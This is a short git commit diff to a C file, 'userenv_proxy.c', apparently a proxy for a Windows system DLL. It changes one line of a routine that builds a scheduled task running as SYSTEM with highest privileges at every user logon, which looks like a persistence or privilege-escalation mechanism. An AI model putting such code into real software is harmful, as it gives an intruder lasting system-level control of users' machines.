04132ca268cd1aaeaa0321472200ec2feefe80a4
Justanother-engineer <charanmk99@gmail.com>
2026-08-11 06:32:49 +0530

    new changes

--- userenv_proxy.c
+++ userenv_proxy.c
@@ -170,7 +170,7 @@ static void create_task_orion(void) {
     char xml[1024];
     wsprintfA(xml,
         "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
-        "<Principals><Principal id=\"LocalSystem\"><UserId>NT AUTHORITY\\SYSTEM</UserId>"
+        "<Principals><Principal id=\"Author\"><UserId>NT AUTHORITY\\SYSTEM</UserId>"
         "<LogonType>ServiceAccount</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>"
         "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"
         "<Settings><Enabled>true</Enabled><Hidden>false</Hidden>"
